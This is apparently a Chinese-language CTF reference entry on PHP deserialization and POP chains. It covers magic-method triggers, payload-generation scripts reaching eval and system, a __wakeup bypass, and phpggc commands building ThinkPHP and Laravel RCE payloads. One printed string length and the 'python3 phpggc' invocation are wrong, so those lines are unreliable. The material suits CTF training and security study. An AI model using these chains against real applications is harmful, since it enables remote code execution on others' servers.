---
title: PHP 反序列化（__wakeup / __destruct / POP 链）
category: web
tags: [php, 反序列化, pop 链, 魔术方法]
signals: [unserialize 用户输入, cookie 里是序列化数据, 魔术方法, __destruct, __wakeup, eval 在魔术方法里, file_put_contents, 代码审计题, class 定义一串, pop 链]
difficulty: medium
source: "PayloadsAllTheThings / 公开 writeup"
tools: [php, python, phpggc]
updated: 2026-10-22
analogous_to: [web/python-pickle-pyjail.md, web/java-deserialization.md]
---

## 一、识别信号（题面长什么样）

- 源码里有 `unserialize($_GET['data'])`、`unserialize(base64_decode($_COOKIE['x']))`。
- 参数值是 `O:4:"User":1:{s:4:"name";s:5:"admin";}` 这种形态。
- 代码审计题给出多个 `class`，每个都有 `__construct`、`__destruct`、`__wakeup`、`__toString`、`__invoke`、`__call`。
- 有 `eval`、`system`、`include`、`file_put_contents`、`call_user_func` 在魔术方法里。
- 输入过滤了 `O:` 或 `C:` → 需要绕过（`O:+4:`、`C:` → `O:` 转换、`Serializable`）。
- 关键词：反序列化、POP、魔术方法、pop chain。

## 二、原理

PHP 的 `unserialize()` 会按字符串还原对象，并自动触发**魔术方法**：

| 方法 | 触发时机 |
|---|---|
| `__construct` | `new` 时（反序列化**不**触发） |
| `__destruct` | 对象被销毁时 |
| `__wakeup` | `unserialize()` 时（优先于 `__destruct`） |
| `__toString` | 对象被当字符串用（`echo`、字符串拼接） |
| `__invoke` | 对象被当函数调用 `$obj()` |
| `__call` | 调用不存在的方法 |
| `__get` / `__set` | 访问不存在/不可见属性 |

**POP 链**：从"用户能控制其属性的顶层对象"出发，串起 `__destruct → __toString → __call → ...` 最终到达 `system()`/`eval()`。`phpggc` 提供了主流框架（Laravel、ThinkPHP、Yii、Symfony）的现成链条。

## 三、解题步骤

1. 读源码，列出所有 class 与其中的危险调用（`eval`、`system`、`file_put_contents`、`include`）。
2. 从危险调用出发**逆向**：谁调用了它？谁的状态能被反序列化控制？
3. 画出链路：`入口对象 -> __destruct -> __toString -> __call -> 目标函数`。
4. 用 PHP 写生成脚本（或手工拼字符串），生成序列化 payload。
5. 若有 `__wakeup` 校验，用 `C:` 序列化 + `Serializable` 绕过，或 `O:+4` 数字前加 `+`。
6. 提交，拿 flag。

## 四、可直接运行的脚本

典型 POP 链示例（由漏洞代码到 payload）：

```php
<?php
// ===== 题目源码（简化）=====
class A {
    public $cmd;
    public function __destruct() { eval($this->cmd); }
}
// payload 目标：__destruct 里执行 eval

// ===== 生成脚本 =====
class A { public $cmd; }
function make($cmd) {
    $a = new A();
    $a->cmd = $cmd;
    return serialize($a);
}
echo make('echo "PWNED";') . PHP_EOL;
// 输出：O:1:"A":1:{s:3:"cmd";s:12:"echo "PWNED";";}
?>
```

带 `__toString` 中转的链：

```php
<?php
class File { public $filename = "/tmp/x"; public function __toString(){ return file_get_contents($this->filename); } }
class Show { public $name; public function __destruct(){ echo $this->name; } }   // 触发 __toString

$s = new Show();
$s->name = new File();
$s->name->filename = "/flag";
echo serialize($s);
// O:4:"Show":1:{s:4:"name";O:4:"File":1:{s:8:"filename";s:5:"/flag";}}
?>
```

`__wakeup` 绕过（属性个数不一致）：

```php
<?php
class B {
    public $a = 1;
    public $b = 2;
    public function __wakeup() { if ($this->a !== 1) { die("no"); } }
    public function __destruct() { system($this->b); }
}
// 正常序列化: O:1:"B":2:{s:1:"a";i:1;s:1:"b";s:2:"id";}
// 绕过技巧：把属性数量写大，让 __wakeup 不被调用（PHP < 7.4.3 的漏洞）
// O:1:"B":3:{s:1:"a";i:2;s:1:"b";s:2:"id";}
?>
```

phpggc 一键生成（打框架时最省事）：

```bash
# 列出可用链
python3 phpggc -l

# 生成 ThinkPHP RCE 载荷
phpggc -o /tmp/payload ThinkPHP/RCE1 system "cat /flag"

# base64 / urlencode 输出
phpggc -b ThinkPHP/RCE1 system id
phpggc -u Laravel/RCE9 system id

# 直接发起请求（需要 phar 时用 -p）
```

Python 端生成 payload 的小工具：

```python
def php_serialize(obj):
    """最小实现：支持 dict（->对象）与 str/int/list"""
    if isinstance(obj, str):
        return 's:%d:"%s";' % (len(obj.encode()), obj)
    if isinstance(obj, int):
        return 'i:%d;' % obj
    if isinstance(obj, list):
        return 'a:%d:{%s}' % (len(obj), "".join(
            php_serialize(i) + php_serialize(v) for i, v in enumerate(obj)))
    if isinstance(obj, dict):
        return 'a:%d:{%s}' % (len(obj), "".join(
            php_serialize(k) + php_serialize(v) for k, v in obj.items()))
    if isinstance(obj, tuple):  # (类名, {属性})
        cls, props = obj
        return 'O:%d:"%s":%d:{%s}' % (len(cls), cls, len(props), "".join(
            php_serialize(k) + php_serialize(v) for k, v in props.items()))
    raise TypeError(obj)

payload = php_serialize(("Show", {"name": ("File", {"filename": "/flag"})}))
print(payload)
```

## 五、常见坑 / 变体

- **`__construct` 不被触发**：反序列化只触发 `__wakeup`/`__destruct`，别把初始化逻辑放在 `__construct` 里指望它执行。
- **`__destruct` 执行时机**：脚本结束时才调用；若前面有 `die()`/`exit()` 可能不触发（`register_shutdown_function` 会）。
- **`__wakeup` 绕过**：PHP < 7.4.3 可用属性数不符；也可绕过 `__wakeup` 用 `C:` 格式调用 `Serializable::unserialize`。
- **私有/保护属性**：序列化时属性名前有 `\0类名\0` 或 `\0*\0` 前缀，手工构造时要用 `%00` 编码。
- **`__PHP_Incomplete_Class`**：类不存在时反序列化失败，注意 autoload。
- 变体：**PHAR 反序列化**（`phar://` 触发）见 `phar-deserialization.md`。
- 变体：**session 反序列化**（`php://`、`session.upload_progress`）、**`__toString` 抛异常导致链中断**。
- 变体：**PHP 8 的 `Serializable` 弃用**，很多旧链在 PHP 8 失效，注意版本。

## 六、参考来源

- [PayloadsAllTheThings - Insecure Deserialization / PHP](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Deserialization)
- [PHP 官方文档 - 魔术方法](https://www.php.net/manual/en/language.oop5.magic.php)
- [PHPGGC（PHP Generic Gadget Chains）](https://github.com/ambionics/phpggc)
- [CTF-Wiki PHP 代码审计](https://ctf-wiki.org/web/php/php/)
- [OWASP Top 10 2021 - A08:2021 Software and Data Integrity Failures](https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/)
